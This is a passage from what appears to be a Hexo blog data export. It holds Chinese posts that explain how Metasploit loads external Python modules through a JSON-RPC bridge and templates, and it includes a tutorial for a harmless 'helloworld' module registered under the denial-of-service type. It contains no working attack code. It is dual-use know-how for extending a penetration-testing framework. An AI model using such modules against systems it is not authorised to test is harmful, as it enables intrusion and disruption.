end</span><br><span class=\"line\"> </span><br><span class=\"line\">  def to_json</span><br><span class=\"line\">    params =</span><br><span class=\"line\">      if self.params.respond_to? :to_nested_values</span><br><span class=\"line\">        self.params.to_nested_values</span><br><span class=\"line\">      else</span><br><span class=\"line\">        self.params.to_h</span><br><span class=\"line\">      end</span><br><span class=\"line\">    JSON.generate(&#123;jsonrpc: &apos;2.0&apos;, id: self.id, method: self.method, params: params&#125;)</span><br><span class=\"line\">  end</span><br></pre></td></tr></table></figure></p>\n<p>这个类实际上是对传递给metasploit的信息的一个封装.<br><code>initialize</code>是ruby的初始化方法 从这里可以看到它有三个属性<code>method</code> <code>params</code> <code>id</code> </p>\n<p><code>from_module</code>方法则是用于将传递的参数转换成自身<br><code>to_json</code>方法很明显就是转换成一个可用的json(jsonrpc传递需要json格式)</p>\n<p>这里是省略了不重要的细节的<code>bridge.rb</code>代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">require &apos;msf/core/modules/external/message&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">class Msf::Modules::External::Bridge</span><br><span class=\"line\">  </span><br><span class=\"line\">  # 通过jsonrpc运行</span><br><span class=\"line\">  def run(datastore)</span><br><span class=\"line\">    unless self.running</span><br><span class=\"line\">      m = Msf::Modules::External::Message.new(:run)</span><br><span class=\"line\">      m.params = datastore.dup</span><br><span class=\"line\">      send(m)</span><br><span class=\"line\">      self.running = true</span><br><span class=\"line\">    end</span><br><span class=\"line\">  end</span><br><span class=\"line\">\t</span><br><span class=\"line\">  # 获取当前状态和恢复run状态  </span><br><span class=\"line\">  def get_status</span><br><span class=\"line\">    if self.running || !self.messages.empty?</span><br><span class=\"line\">      m = receive_notification</span><br><span class=\"line\">      if m.nil?</span><br><span class=\"line\">        close_ios</span><br><span class=\"line\">        self.messages.close</span><br><span class=\"line\">        self.running = false</span><br><span class=\"line\">      end</span><br><span class=\"line\"></span><br><span class=\"line\">      return m</span><br><span class=\"line\">    end</span><br><span class=\"line\">  end</span><br><span class=\"line\">  </span><br><span class=\"line\">  # 接收</span><br><span class=\"line\">  def recv(filter_id=nil, timeout=600)</span><br><span class=\"line\">    _, out, err = self.ios</span><br><span class=\"line\">    message = &apos;&apos;</span><br><span class=\"line\">  </span><br><span class=\"line\">  # jsonrpc发送和接受</span><br><span class=\"line\">  def send_receive(message)</span><br><span class=\"line\">    send(message)</span><br><span class=\"line\">    recv(message.id)</span><br><span class=\"line\">  end</span><br><span class=\"line\">  </span><br><span class=\"line\">  # 发送模块元数据</span><br><span class=\"line\">  def describe</span><br><span class=\"line\">    resp = send_receive(Msf::Modules::External::Message.new(:describe))</span><br><span class=\"line\">    close_ios</span><br><span class=\"line\">    resp.params</span><br><span class=\"line\">  end</span><br><span class=\"line\">  \t</span><br><span class=\"line\">  # 发送  </span><br><span class=\"line\">  def send(message)</span><br><span class=\"line\">    input, output, err, status = ::Open3.popen3(self.env, self.cmd)</span><br><span class=\"line\">    self.ios = [input, output, err]</span><br><span class=\"line\">    self.wait_thread = status</span><br><span class=\"line\">    case select(nil, [input], nil, 0.1)</span><br><span class=\"line\">    when nil</span><br><span class=\"line\">      raise &quot;Cannot run module #&#123;self.path&#125;&quot;</span><br><span class=\"line\">    when [[], [input], []]</span><br><span class=\"line\">      m = message.to_json</span><br><span class=\"line\">      write_message(input, m)</span><br><span class=\"line\">    else</span><br><span class=\"line\">      raise &quot;Error running module #&#123;self.path&#125;&quot;</span><br><span class=\"line\">    end</span><br><span class=\"line\">  end</span><br><span class=\"line\">  </span><br><span class=\"line\">  # TODO 这里原本有一大段关于网络接受的代码 </span><br><span class=\"line\"></span><br><span class=\"line\"># 每个编程语言扩展的具体实现</span><br><span class=\"line\">class Msf::Modules::External::PyBridge &lt; Msf::Modules::External::Bridge</span><br><span class=\"line\"> # 判断是否是py文件</span><br><span class=\"line\">  def self.applies?(module_name)</span><br><span class=\"line\">    module_name.match? /\\.py$/</span><br><span class=\"line\">  end</span><br><span class=\"line\"> </span><br><span class=\"line\">  # 初始化 python扩展添加了额外的路径</span><br><span class=\"line\">  def initialize(module_path)</span><br><span class=\"line\">    super</span><br><span class=\"line\">    pythonpath = ENV[&apos;PYTHONPATH&apos;] || &apos;&apos;</span><br><span class=\"line\">    self.env = self.env.merge(&#123; &apos;PYTHONPATH&apos; =&gt; pythonpath + File::PATH_SEPARATOR + File.expand_path(&apos;../python&apos;, __FILE__) &#125;)</span><br><span class=\"line\">  end</span><br><span class=\"line\">end</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class Msf::Modules::External::Bridge</span><br><span class=\"line\">  # 载入列表 我们可以期待更多的语言可以编写msf模块 如Msf::Modules::External::JsBridge?</span><br><span class=\"line\">  LOADERS = [</span><br><span class=\"line\">    Msf::Modules::External::PyBridge,</span><br><span class=\"line\">    Msf::Modules::External::Bridge</span><br><span class=\"line\">  ]</span><br><span class=\"line\">\t</span><br><span class=\"line\">  # 运行模块方法 让载入的bridge都判断是否是自己所属的 </span><br><span class=\"line\">  def self.open(module_path)</span><br><span class=\"line\">    LOADERS.each do |klass|</span><br><span class=\"line\">      return klass.new module_path if klass.applies? module_path</span><br><span class=\"line\">    end</span><br><span class=\"line\">    nil</span><br><span class=\"line\">  end</span><br><span class=\"line\">end</span><br></pre></td></tr></table></figure></p>\n<p>这里是省略了不重要的细节的<code>shim.rb</code>代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">require &apos;msf/core/modules/external/bridge&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">class Msf::Modules::External::Shim</span><br><span class=\"line\">  # 将bridge返回的数据生成一个模块</span><br><span class=\"line\">  def self.generate(module_path)</span><br><span class=\"line\">    mod = Msf::Modules::External::Bridge.open(module_path)</span><br><span class=\"line\">    return &apos;&apos; unless mod.meta</span><br><span class=\"line\">    # 这里根据模块元数据来选择模板 目前只有3个 元数据获取查看bridge.rb的meta方法 </span><br><span class=\"line\">    case mod.meta[&apos;type&apos;]</span><br><span class=\"line\">    when &apos;remote_exploit_cmd_stager&apos;</span><br><span class=\"line\">      remote_exploit_cmd_stager(mod)</span><br><span class=\"line\">    when &apos;capture_server&apos;</span><br><span class=\"line\">      capture_server(mod)</span><br><span class=\"line\">    when &apos;dos&apos;</span><br><span class=\"line\">      dos(mod)</span><br><span class=\"line\">    when &apos;scanner.multi&apos;</span><br><span class=\"line\">      multi_scanner(mod)</span><br><span class=\"line\">    else</span><br><span class=\"line\">      # TODO have a nice load error show up in the logs</span><br><span class=\"line\">      &apos;&apos;</span><br><span class=\"line\">    end</span><br><span class=\"line\">  end</span><br><span class=\"line\">  </span><br><span class=\"line\">  # 返回一个模块 erb是ruby的一个代码模板库</span><br><span class=\"line\">  def self.render_template(name, meta = &#123;&#125;)</span><br><span class=\"line\">    template = File.join(File.dirname(__FILE__), &apos;templates&apos;, name)</span><br><span class=\"line\">    ERB.new(File.read(template)).result(binding)</span><br><span class=\"line\">  end</span><br><span class=\"line\"></span><br><span class=\"line\">  def self.common_metadata(meta = &#123;&#125;)</span><br><span class=\"line\">    render_template(&apos;common_metadata.erb&apos;, meta)</span><br><span class=\"line\">  end</span><br><span class=\"line\">  </span><br><span class=\"line\">  # 数据转换</span><br><span class=\"line\">  def self.mod_meta_common(mod, meta = &#123;&#125;)</span><br><span class=\"line\">    meta[:path]        = mod.path.dump</span><br><span class=\"line\">    meta[:name]        = mod.meta[&apos;name&apos;].dump</span><br><span class=\"line\">    meta[:description] = mod.meta[&apos;description&apos;].dump</span><br><span class=\"line\">    meta[:authors]     = mod.meta[&apos;authors&apos;].map(&amp;:dump).join(&quot;,\\n          &quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">    meta[:options]     = mod.meta[&apos;options&apos;].map do |n, o|</span><br><span class=\"line\">      &quot;Opt#&#123;o[&apos;type&apos;].camelize&#125;.new(#&#123;n.dump&#125;,</span><br><span class=\"line\">        [#&#123;o[&apos;required&apos;]&#125;, #&#123;o[&apos;description&apos;].dump&#125;, #&#123;o[&apos;default&apos;].inspect&#125;])&quot;</span><br><span class=\"line\">    end.join(&quot;,\\n          &quot;)</span><br><span class=\"line\">    meta</span><br><span class=\"line\">  end</span><br><span class=\"line\"></span><br><span class=\"line\"> # 渲染膜拜</span><br><span class=\"line\">  def self.dos(mod)</span><br><span class=\"line\">    meta = mod_meta_common(mod)</span><br><span class=\"line\">    meta[:date] = mod.meta[&apos;date&apos;].dump</span><br><span class=\"line\">    meta[:references] = mod.meta[&apos;references&apos;].map do |r|</span><br><span class=\"line\">      &quot;[#&#123;r[&apos;type&apos;].upcase.dump&#125;, #&#123;r[&apos;ref&apos;].dump&#125;]&quot;</span><br><span class=\"line\">    end.join(&quot;,\\n          &quot;)</span><br><span class=\"line\">    render_template(&apos;dos.erb&apos;, meta)</span><br><span class=\"line\">  end</span><br><span class=\"line\">end</span><br></pre></td></tr></table></figure></p>\n<p>所以python模块的运行过程其实是这样的</p>\n<ol>\n<li>class Msf::Modules::External::Shim获取到了模块路径</li>\n<li>调用Msf::Modules::External::Bridge.open</li>\n<li>在open方法 Msf::Modules::External::PyBridge::applies判断成功(也就是确认了是python模块)</li>\n<li>初始化一个Msf::Modules::External::PyBridge并返回</li>\n<li>判断元数据类型 假设是dos 则调用dos方法</li>\n<li>调用mod_meta_common方法转换元数据 渲染代码模板</li>\n</ol>\n<p>我们可以查看<code>dos.erb</code>的内容<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">require &apos;msf/core/modules/external/bridge&apos;</span><br><span class=\"line\">require &apos;msf/core/module/external&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">class MetasploitModule &lt; Msf::Auxiliary</span><br><span class=\"line\">  include Msf::Module::External</span><br><span class=\"line\">  include Msf::Auxiliary::Dos</span><br><span class=\"line\"></span><br><span class=\"line\">  def initialize</span><br><span class=\"line\">    super(&#123;</span><br><span class=\"line\">\t  &lt;%= common_metadata meta %&gt;</span><br><span class=\"line\">      &apos;References&apos;  =&gt;</span><br><span class=\"line\">        [</span><br><span class=\"line\">          &lt;%= meta[:references] %&gt;</span><br><span class=\"line\">        ],</span><br><span class=\"line\">      &apos;DisclosureDate&apos; =&gt; &lt;%= meta[:date] %&gt;,</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">      register_options([</span><br><span class=\"line\">        &lt;%= meta[:options] %&gt;</span><br><span class=\"line\">      ])</span><br><span class=\"line\">  end</span><br><span class=\"line\"></span><br><span class=\"line\">  def run</span><br><span class=\"line\">    print_status(&quot;Starting server...&quot;)</span><br><span class=\"line\">    mod = Msf::Modules::External::Bridge.open(&lt;%= meta[:path] %&gt;)</span><br><span class=\"line\">    mod.run(datastore)</span><br><span class=\"line\">    wait_status(mod)</span><br><span class=\"line\">  end</span><br><span class=\"line\">end</span><br></pre></td></tr></table></figure></p>\n<p>所以事实上python模块的实现就是将python代码中元数据传递到代码模板 然后实际上调用的还是ruby模板 我们的python文件路径将会出现在<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mod = Msf::Modules::External::Bridge.open(&lt;%= meta[:path] %&gt;)</span><br><span class=\"line\">mod.run(datastore)</span><br></pre></td></tr></table></figure></p>\n<p>最后通过<code>bridge.run</code>调用.这种扩展方法不但没有失去对ruby模块的强大支持也没丢失python的灵活性 非常好</p>\n"},{"title":"metasploit python 模块","date":"2018-02-02T01:31:50.000Z","_content":"\nmetasploit在2017年尾将python作为官方支持语言,并且已经有python模块加入主分支.这使得我们开发metasploit模块可以不去学习ruby\n\n### 为什么将python作为官方支持语言\n1. 很多不是metasploit官方人员编程的模块都是使用python编写\n2. 现在python流行程度非常高 很多渗透人员python熟练程度比ruby高\n\n### metasploit的python模块是什么\n主分支的一个python模块 https://github.com/rapid7/metasploit-framework/blob/778e69f92912c555e72bc3318278443126704b75/modules/auxiliary/dos/http/slowloris.py\n\npython模块实际是通过json-rpc调用与metasploit通信\n\nmetasploit获取元数据如图(来自官方博客)\n~~~\n+------------+\n| Metasploit |\n|            |  Describe yourself  +-------------------+\n|            +-------------------> |  some_module.py   |\n|            |                     |                   |\n|            |                     |                   |\n|            |   Some metadata     |                   |\n|            | <-------------------+                   |\n|            |                     |                   |\n|            |                     +-------------------+\n|            |\n|            |\n+------------+\n~~~\n\n模块调用如图\n~~~\n+------------+\n| Metasploit |  Do a thing with\n|            |   these options     +-------------------+\n|            +-------------------> |  some_module.py   |\n|            |                     |                   |\n|            |                     |                   |\n|            |   A bit of status   |                   |\n|            | <-------------------+                   |\n|            |                     |                   |\n|            |  Moar status        |                   |\n|            | <-------------------+                   |\n|            |                     |                   |\n|            |  I found a thing    |                   |\n|            | <-------------------+                   |\n|            |                     |                   |\n|            |                     +-------------------+\n|            |\n+------------+\n~~~\n\n### 将会发生什么\n实际上对于原来的开发方式没有影响,完全可以使用原来的ruby编写方式.但是对于不熟悉ruby的开发者可以使用python来方便的编写模块\n\n### python在metasploit能做什么\n可以使用的和ruby模块并没有区别\n\n## 如何编写一个python模块\n首先需要导入需要的模块\n~~~\n#!/usr/bin/env python\n# another:bluebird\nfrom metasploit import module\n~~~\n这个metasploit实际上路径是 `lib/msf/core/modules/external/python/`\n\n然后定义元数据 格式和ruby模块的一样.详细可参考[这里的文档](https://www.kancloud.cn/bluebird/metasploit/486941)\n\n~~~\nmetadata = {\n\t# 模块名字\n    'name': 'metasploit python module demo ',\n    # 模块的描述\n    'description': '''\n        send a http request metasploit python module demo\n     ''',\n     # 模块作者\n    'authors': [\n        'bluebird', \n    ],\n    # 编写时间\n    'date': '2018-02-02',\n    # 漏洞参考\n    'references': [\n       \n     ],\n     # 漏洞类型 只能在已有的类型选项 \n    'type': 'dos',\n    # 模块选项\n    'options': {\n        'rhost': {'type': 'address', 'description': 'The target address', 'required': True, 'default': None},\n        'rport': {'type': 'port', 'description': 'The target port', 'required': True, 'default': 80},\n     }}\n~~~\n\n然后一般应该定义一个`run`方法.这个demo输出了helloworld \n~~~\ndef run(args):\n    module.log('helloworld')\n   \n~~~\n\n最后定义主方法\n~~~\nif __name__ == \"__main__\":\n    module.run(metadata, run)\n~~~\n\n让我们实际跑一下(注意请给你的python文件添加执行权限)\n~~~\nmsf5 auxiliary(test/demo) > set rhost 127.0.0.1\nrhost => 127.0.0.1\nmsf5 auxiliary(test/demo) > run\n\n[*] Starting server...\n[*] hello world\n[*] Auxiliary module execution completed\nmsf5 auxiliary(test/demo) > \n~~~\n\n","source":"_posts/metasploit-python-模块.md","raw":"---\ntitle: metasploit python 模块\ndate:  2018-2-02 09:31:50\ntags:\n\t编程技术\n---\n\nmetasploit在2017年尾将python作为官方支持语言,并且已经有python模块加入主分支.这使得我们开发metasploit模块可以不去学习ruby\n\n### 为什么将python作为官方支持语言\n1. 很多不是metasploit官方人员编程的模块都是使用python编写\n2. 现在python流行程度非常高 很多渗透人员python熟练程度比ruby高\n\n### metasploit的python模块是什么\n主分支的一个python模块 https://github.com/rapid7/metasploit-framework/blob/778e69f92912c555e72bc3318278443126704b75/modules/auxiliary/dos/http/slowloris.py\n\npython模块实际是通过json-rpc调用与metasploit通信\n\nmetasploit获取元数据如图(来自官方博客)\n~~~\n+------------+\n| Metasploit |\n|            |  Describe yourself  +-------------------+\n|            +-------------------> |  some_module.py   |\n|            |                     |                   |\n|            |                     |                   |\n|            |   Some metadata     |                   |\n|            | <-------------------+                   |\n|            |                     |                   |\n|            |                     +-------------------+\n|            |\n|            |\n+------------+\n~~~\n\n模块调用如图\n~~~\n+------------+\n| Metasploit |  Do a thing with\n|            |   these options     +-------------------+\n|            +-------------------> |  some_module.py   |\n|            |                     |                   |\n|            |                     |                   |\n|            |   A bit of status   |                   |\n|            | <-------------------+                   |\n|            |                     |                   |\n|            |  Moar status        |                   |\n|            | <-------------------+                   |\n|            |                     |                   |\n|            |  I found a thing    |                   |\n|            | <-------------------+                   |\n|            |                     |                   |\n|            |                     +-------------------+\n|            |\n+------------+\n~~~\n\n### 将会发生什么\n实际上对于原来的开发方式没有影响,完全可以使用原来的ruby编写方式.但是对于不熟悉ruby的开发者可以使用python来方便的编写模块\n\n### python在metasploit能做什么\n可以使用的和ruby模块并没有区别\n\n## 如何编写一个python模块\n首先需要导入需要的模块\n~~~\n#!/usr/bin/env python\n# another:bluebird\nfrom metasploit import module\n~~~\n这个metasploit实际上路径是 `lib/msf/core/modules/external/python/`\n\n然后定义元数据 格式和ruby模块的一样.详细可参考[这里的文档](https://www.kancloud.cn/bluebird/metasploit/486941)\n\n~~~\nmetadata = {\n\t# 模块名字\n    'name': 'metasploit python module demo ',\n    # 模块的描述\n    'description': '''\n        send a http request metasploit python module demo\n     ''',\n     # 模块作者\n    'authors': [\n        'bluebird', \n    ],\n    # 编写时间\n    'date': '2018-02-02',\n    # 漏洞参考\n    'references': [\n       \n     ],\n     # 漏洞类型 只能在已有的类型选项 \n    'type': 'dos',\n    # 模块选项\n    'options': {\n        'rhost': {'type': 'address', 'description': 'The target address', 'required': True, 'default': None},\n        'rport': {'type': 'port', 'description': 'The target port', 'required': True, 'default': 80},\n     }}\n~~~\n\n然后一般应该定义一个`run`方法.这个demo输出了helloworld \n~~~\ndef run(args):\n    module.log('helloworld')\n   \n~~~\n\n最后定义主方法\n~~~\nif __name__ == \"__main__\":\n    module.run(metadata, run)\n~~~\n\n让我们实际跑一下(注意请给你的python文件添加执行权限)\n~~~\nmsf5 auxiliary(test/demo) > set rhost 127.0.0.1\nrhost => 127.0.0.1\nmsf5 auxiliary(test/demo) > run\n\n[*] Starting server...\n[*] hello world\n[*] Auxiliary module execution completed\nmsf5 auxiliary(test/demo) > \n~~~\n\n","slug":"metasploit-python-模块","published":1,"updated":"2018-05-31T01:36:00.303Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkk0wi220005r4nxuvyd4844","content":"<p>metasploit在2017年尾将python作为官方支持语言,并且已经有python模块加入主分支.这使得我们开发metasploit模块可以不去学习ruby</p>\n<h3 id=\"为什么将python作为官方支持语言\"><a href=\"#为什么将python作为官方支持语言\" class=\"headerlink\" title=\"为什么将python作为官方支持语言\"></a>为什么将python作为官方支持语言</h3><ol>\n<li>很多不是metasploit官方人员编程的模块都是使用python编写</li>\n<li>现在python流行程度非常高 很多渗透人员python熟练程度比ruby高</li>\n</ol>\n<h3 id=\"metasploit的python模块是什么\"><a href=\"#metasploit的python模块是什么\" class=\"headerlink\" title=\"metasploit的python模块是什么\"></a>metasploit的python模块是什么</h3><p>主分支的一个python模块 <a href=\"https://github.com/rapid7/metasploit-framework/blob/778e69f92912c555e72bc3318278443126704b75/modules/auxiliary/dos/http/slowloris.py\" target=\"_blank\" rel=\"noopener\">https://github.com/rapid7/metasploit-framework/blob/778e69f92912c555e72bc3318278443126704b75/modules/auxiliary/dos/http/slowloris.py</a></p>\n<p>python模块实际是通过json-rpc调用与metasploit通信</p>\n<p>metasploit获取元数据如图(来自官方博客)<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+------------+</span><br><span class=\"line\">| Metasploit |</span><br><span class=\"line\">|            |  Describe yourself  +-------------------+</span><br><span class=\"line\">|            +-------------------&gt; |  some_module.py   |</span><br><span class=\"line\">|            |                     |                   |</span><br><span class=\"line\">|            |                     |                   |</span><br><span class=\"line\">|            |   Some metadata     |                   |</span><br><span class=\"line\">|            | &lt;-------------------+                   |</span><br><span class=\"line\">|            |                     |                   |</span><br><span class=\"line\">|            |                     +-------------------+</span><br><span class=\"line\">|            |</span><br><span class=\"line\">|            |</span><br><span class=\"line\">+------------+</span><br></pre></td></tr></table></figure></p>\n<p>模块调用如图<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+------------+</span><br><span class=\"line\">| Metasploit |  Do a thing with</span><br><span class=\"line\">|            |   these options     +-------------------+</span><br><span class=\"line\">|            +-------------------&gt; |  some_module.py   |</span><br><span class=\"line\">|            |                     |                   |</span><br><span class=\"line\">|            |                     |                   |</span><br><span class=\"line\">|            |   A bit of status   |                   |</span><br><span class=\"line\">|            | &lt;-------------------+                   |</span><br><span class=\"line\">|            |                     |                   |</span><br><span class=\"line\">|            |  Moar status        |                   |</span><br><span class=\"line\">|            | &lt;-------------------+                   |</span><br><span class=\"line\">|            |                     |                   |</span><br><span class=\"line\">|            |  I found a thing    |                   |</span><br><span class=\"line\">|            | &lt;-------------------+                   |</span><br><span class=\"line\">|            |                     |                   |</span><br><span class=\"line\">|            |                     +-------------------+</span><br><span class=\"line\">|            |</span><br><span class=\"line\">+------------+</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"将会发生什么\"><a href=\"#将会发生什么\" class=\"headerlink\" title=\"将会发生什么\"></a>将会发生什么</h3><p>实际上对于原来的开发方式没有影响,完全可以使用原来的ruby编写方式.但是对于不熟悉ruby的开发者可以使用python来方便的编写模块</p>\n<h3 id=\"python在metasploit能做什么\"><a href=\"#python在metasploit能做什么\" class=\"headerlink\" title=\"python在metasploit能做什么\"></a>python在metasploit能做什么</h3><p>可以使用的和ruby模块并没有区别</p>\n<h2 id=\"如何编写一个python模块\"><a href=\"#如何编写一个python模块\" class=\"headerlink\" title=\"如何编写一个python模块\"></a>如何编写一个python模块</h2><p>首先需要导入需要的模块<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"># another:bluebird</span><br><span class=\"line\">from metasploit import module</span><br></pre></td></tr></table></figure></p>\n<p>这个metasploit实际上路径是 <code>lib/msf/core/modules/external/python/</code></p>\n<p>然后定义元数据 格式和ruby模块的一样.详细可参考<a href=\"https://www.kancloud.cn/bluebird/metasploit/486941\" target=\"_blank\" rel=\"noopener\">这里的文档</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">metadata = &#123;</span><br><span class=\"line\">\t# 模块名字</span><br><span class=\"line\">    &apos;name&apos;: &apos;metasploit python module demo &apos;,</span><br><span class=\"line\">    # 模块的描述</span><br><span class=\"line\">    &apos;description&apos;: &apos;&apos;&apos;</span><br><span class=\"line\">        send a http request metasploit python module demo</span><br><span class=\"line\">     &apos;&apos;&apos;,</span><br><span class=\"line\">     # 模块作者</span><br><span class=\"line\">    &apos;authors&apos;: [</span><br><span class=\"line\">        &apos;bluebird&apos;, </span><br><span class=\"line\">    ],</span><br><span class=\"line\">    # 编写时间</span><br><span class=\"line\">    &apos;date&apos;: &apos;2018-02-02&apos;,</span><br><span class=\"line\">    # 漏洞参考</span><br><span class=\"line\">    &apos;references&apos;: [</span><br><span class=\"line\">       </span><br><span class=\"line\">     ],</span><br><span class=\"line\">     # 漏洞类型 